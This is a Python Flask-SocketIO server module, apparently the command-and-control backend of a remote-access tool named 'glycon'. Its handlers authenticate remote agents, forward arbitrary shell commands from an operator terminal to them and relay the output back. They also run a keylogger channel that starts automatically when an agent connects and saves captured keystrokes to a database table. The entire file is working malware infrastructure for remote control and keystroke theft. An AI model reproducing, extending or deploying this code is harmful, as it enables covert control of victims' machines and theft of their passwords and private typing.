from flask_login import current_user
from flask_socketio import SocketIO, join_room, leave_room, emit
from glycon.config import CONFIG
import sqlite3
from datetime import datetime
import json
import os
from glycon.secure_comms import SecureComms

def init_socket_handlers(socketio):
    active_agents = {}  
    keylogger_active_agents = {}  # Track agents with keylogger started
    connection_count = 0

    # Ensure keylogs table exists
    conn = sqlite3.connect(CONFIG.database)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS keylogs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT NOT NULL,
            keys TEXT NOT NULL,
            timestamp TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

    @socketio.on('connect', namespace='/terminal')
    def handle_terminal_connect():
        nonlocal connection_count
        connection_count += 1
        print(f"[SocketIO] Terminal client connected. Total connections: {connection_count}")
        if current_user.is_authenticated:
            print(f"[SocketIO] Authenticated user: {current_user.id}")

    @socketio.on('join_terminal', namespace='/terminal')
    def handle_join_terminal(data):
        if current_user.is_authenticated:
            join_room(f"terminal_{data['agent_id']}")
            print(f"[SocketIO] Terminal UI joined room for agent {data['agent_id']}")

    @socketio.on('disconnect', namespace='/terminal')
    def handle_terminal_disconnect():
        nonlocal connection_count
        connection_count -= 1
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

    @socketio.on('agent_connect', namespace='/terminal')
    def handle_agent_connect(data):
        nonlocal connection_count
        try:
            print(f"[SocketIO] Agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Authentication failed: Invalid token")
                return False
            
            join_room(f"agent_{data['agent_id']}", namespace='/terminal')
            active_agents[data['agent_id']] = True
            connection_count += 1
            print(f"[SocketIO] Agent authenticated. Total connections: {connection_count}")
            print(f"[SocketIO] Current active_agents: {list(active_agents.keys())}")
            
            # Update database
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("UPDATE agents SET ws_connected=1 WHERE id=?", (data['agent_id'],))
            conn.commit()
            conn.close()
            
            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/terminal')
            
            emit('status', {
                'status': 'connected',
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            
            print(f"[SocketIO] Agent {data['agent_id']} fully connected")
            return True
        except Exception as e:
            print(f"[SocketIO] Agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"terminal_{data['agent_id']}", namespace='/terminal')
            return False

    @socketio.on('disconnect', namespace='/terminal')
    def handle_agent_disconnect():
        nonlocal connection_count
        # Remove agent from active_agents on disconnect
        rooms = socketio.server.manager.rooms.get('/terminal', {})
        disconnected_agents = []
        for agent_id in list(active_agents.keys()):
            if f"agent_{agent_id}" not in rooms:
                disconnected_agents.append(agent_id)
                active_agents.pop(agent_id, None)
                keylogger_active_agents.pop(agent_id, None)
                connection_count -= 1
                print(f"[SocketIO] Agent {agent_id} disconnected and removed from active_agents")
                print(f"[SocketIO] Current active_agents after disconnect: {list(active_agents.keys())}")
                
                conn = sqlite3.connect(CONFIG.database)
                c = conn.cursor()
                c.execute("UPDATE agents SET ws_connected=0 WHERE id=?", (agent_id,))
                conn.commit()
                conn.close()
                
                emit('status', {
                    'status': 'disconnected',
                    'agent_id': agent_id
                }, room=f"terminal_{agent_id}", namespace='/terminal')
                
                emit('ws_status', {
                    'agent_id': agent_id,
                    'action': 'stop',
                    'status': 'success',
                    'message': 'WebSocket disconnected'
                }, room=f"terminal_{agent_id}", namespace='/terminal')
        print(f"[SocketIO] Terminal client disconnected. Total connections: {connection_count}")

    @socketio.on('keep_alive', namespace='/terminal')
    def handle_keep_alive(data):
        # Simply acknowledge the keep_alive ping to keep connection alive
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            print(f"[SocketIO] Received keep_alive ping from agent {agent_id}")
            emit('keep_alive_ack', {'status': 'success'}, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('execute_command', namespace='/terminal')
    def handle_execute_command(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            command = data.get('command')
            if not agent_id or not command:
                print("[SocketIO] execute_command event missing agent_id or command")
                return
            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command}")
            # Forward the command to the agent's room
            emit('execute_command', {
                'command': command,
                'agent_id': agent_id
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('command', namespace='/terminal')
    def handle_command(data):
        if current_user.is_authenticated:
            agent_id = data.get('agent_id')
            command = data.get('command')
            current_dir = data.get('current_dir')
            if not agent_id or not command:
                print("[SocketIO] command event missing agent_id or command")
                return
            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command} with current_dir: {current_dir}")
            # Forward the command to the agent's room as execute_command event
            emit('execute_command', {
                'command': command,
                'agent_id': agent_id,
                'current_dir': current_dir
            }, room=f"agent_{agent_id}", namespace='/terminal')

    @socketio.on('command_result', namespace='/terminal')
    def handle_command_result(data):
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] command_result event missing agent_id")
            return
        print(f"[SocketIO] Forwarding command result from agent {agent_id}")
        # Forward the result to the terminal UI room
        emit('terminal_output', data, room=f"terminal_{agent_id}", namespace='/terminal')

    @socketio.on('agent_connect', namespace='/keylogger')
    def handle_keylogger_agent_connect(data):
        try:
            print(f"[SocketIO] Keylogger agent connection attempt: {data['agent_id']}")
            decrypted = SecureComms.decrypt(data['auth_token'])
            if decrypted.get('agent_id') != data['agent_id']:
                print("[SocketIO] Keylogger authentication failed: Invalid token")
                return False

            # Auto-start keylogger when agent connects to keylogger namespace
            if data['agent_id'] not in keylogger_active_agents:
                keylogger_active_agents[data['agent_id']] = True
                print(f"[SocketIO] Auto-starting keylogger for agent {data['agent_id']}")

            join_room(f"agent_{data['agent_id']}", namespace='/keylogger')
            active_agents[data['agent_id']] = True
            print(f"[SocketIO] Keylogger agent authenticated: {data['agent_id']}")

            emit('agent_connected', {
                'status': 'success',
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')

            # Emit keylogger_status to confirm it's started
            emit('keylogger_status', {'status': 'started'}, room=f"agent_{data['agent_id']}", namespace='/keylogger')

            return True
        except Exception as e:
            print(f"[SocketIO] Keylogger agent connection error: {str(e)}")
            emit('status', {
                'status': 'error',
                'message': str(e),
                'agent_id': data['agent_id']
            }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
            return False

    @socketio.on('start_keylogger', namespace='/keylogger')
    def handle_start_keylogger(data):
        agent_id = data.get('agent_id')
        if not agent_id:
            print("[SocketIO] start_keylogger event missing agent_id")
            return
        # Mark keylogger as started for this agent
        keylogger_active_agents[agent_id] = True
        print(f"[SocketIO] Keylogger started on agent {agent_id}")
        emit('keylogger_status', {'status': 'started'}, room=f"agent_{agent_id}", namespace='/keylogger')

    @socketio.on('keylogger_data', namespace='/keylogger')
    def handle_keylogger_data(data):
        agent_id = data.get('agent_id')
        keys = data.get('keys')
        timestamp = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
        if not agent_id or not keys:
            print("[SocketIO] keylogger_data event missing agent_id or keys")
            return
        if agent_id not in keylogger_active_agents:
            print(f"[SocketIO] Unauthorized keylogger_data event received from agent {agent_id}")
            emit('keylogger_ack', {'status': 'error', 'message': 'Keylogger not started'}, room=f"agent_{agent_id}", namespace='/keylogger')
            return
        try:
            print(f"[SocketIO] Saving keylogger data for agent {agent_id}: {keys}")
            conn = sqlite3.connect(CONFIG.database)
            c = conn.cursor()
            c.execute("PRAGMA foreign_keys = ON")
            c.execute("INSERT INTO keylogs (agent_id, keys, timestamp) VALUES (?, ?, ?)", (agent_id, keys, timestamp))
            conn.commit()
            conn.close()
            emit('keylogger_ack', {'status': 'success'}, room=f"agent_{agent_id}", namespace='/keylogger')
        except sqlite3.IntegrityError as e:
            print(f"[SocketIO] Database integrity error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': 'Database integrity error'}, room=f"agent_{agent_id}", namespace='/keylogger')
        except Exception as e:
            print(f"[SocketIO] Error saving keylogger data: {str(e)}")
            emit('keylogger_ack', {'status': 'error', 'message': str(e)}, room=f"agent_{agent_id}", namespace='/keylogger')

    @socketio.on('join', namespace='/keylogger')
    def handle_join(data):
        room = data
        agent_id = None
        if isinstance(data, dict):
            room = data.get('room')
            agent_id = data.get('agent_id')
        if not room:
            print("[SocketIO] join event missing room")
            return
        if agent_id and agent_id not in keylogger_active_agents:
            print(f"[SocketIO] Keylogger join denied: Keylogger not started on agent {agent_id}")
            emit('status', {
                'status': 'error',
                'message': 'Keylogger not started on agent',
                'agent_id': agent_id
            }, room=room, namespace='/keylogger')
            return
        join_room(room, namespace='/keylogger')
